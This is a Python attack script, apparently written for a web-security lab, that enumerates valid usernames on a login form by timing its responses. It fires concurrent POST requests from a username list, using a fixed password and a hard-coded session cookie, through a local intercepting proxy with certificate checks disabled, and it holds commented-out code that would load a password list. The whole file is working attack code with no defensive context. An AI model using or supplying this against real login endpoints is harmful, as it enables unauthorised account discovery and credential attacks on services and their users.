import urllib.parse 
import urllib3 
from concurrent.futures import ThreadPoolExecutor 
import sys 
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def auth(url):
    # read usernames 
    with open('../usernames.txt') as usernames:
        users = set(username.strip() for username in usernames) 

    #read passwords 
    # with open('../passwords.txt') as passwords:
    #     passkeys = set(password.strip() for password in passwords)

    proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

    with ThreadPoolExecutor(max_workers=10) as executor:
        # first enumerate the usernames              
        futures = []        
        cookies = {'session':'EC4Be63Akm9DHepakbGvWMmltCNQeFeP'}
        for username in users:
            params = {
            'username': username,
            'password': 'tetspass798'
            }

            future = executor.submit(requests.post, url, data=params, cookies=cookies, proxies=proxies, verify=False)
            futures.append((future, username))

        for future, username in futures:
            result = future.result()
            response_delay = result.elapsed.total_seconds()
            print(f'{username} : {response_delay:.2f}')
                        
def main():
    if len(sys.argv) != 2:
        print(f'[+] Usage: {sys.argv[0]} <url>')
        print(f'[+] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)

    url = sys.argv[1]    
    print('[+] Breaking authenticaation..')
    auth(url)


if __name__ == '__main__':
    main()